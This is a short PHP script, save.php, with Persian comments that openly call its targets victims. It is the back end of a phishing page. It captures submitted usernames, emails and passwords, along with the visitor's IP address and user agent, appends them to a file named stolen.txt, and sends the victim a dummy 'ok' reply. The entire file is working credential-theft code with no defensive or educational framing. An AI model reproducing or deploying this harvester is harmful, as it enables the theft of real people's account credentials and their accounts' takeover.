<?php
// save.php — دیتاهای قربانی رو توی یه فایل txt ذخیره می‌کنه

$data = [
    'time'     => date('Y-m-d H:i:s'),
    'ip'       => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
    'agent'    => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
    'service'  => $_POST['service'] ?? '-',
    'username' => $_POST['username'] ?? '-',
    'email'    => $_POST['email'] ?? '-',
    'password' => $_POST['password'] ?? '-'
];

$line  = "==============================\n";
$line .= "Time:     " . $data['time'] . "\n";
$line .= "IP:       " . $data['ip'] . "\n";
$line .= "Service:  " . $data['service'] . "\n";
$line .= "Username: " . $data['username'] . "\n";
$line .= "Email:    " . $data['email'] . "\n";
$line .= "Password: " . $data['password'] . "\n";
$line .= "User-Agent: " . $data['agent'] . "\n";
$line .= "==============================\n\n";

// ذخیره توی فایل stolen.txt
file_put_contents(__DIR__ . '/stolen.txt', $line, FILE_APPEND | LOCK_EX);

// به قربانی یه پاسخ خالی برمی‌گردونیم (مهم نیست)
header('Content-Type: application/json');
echo json_encode(['status'=>'ok']);
?>
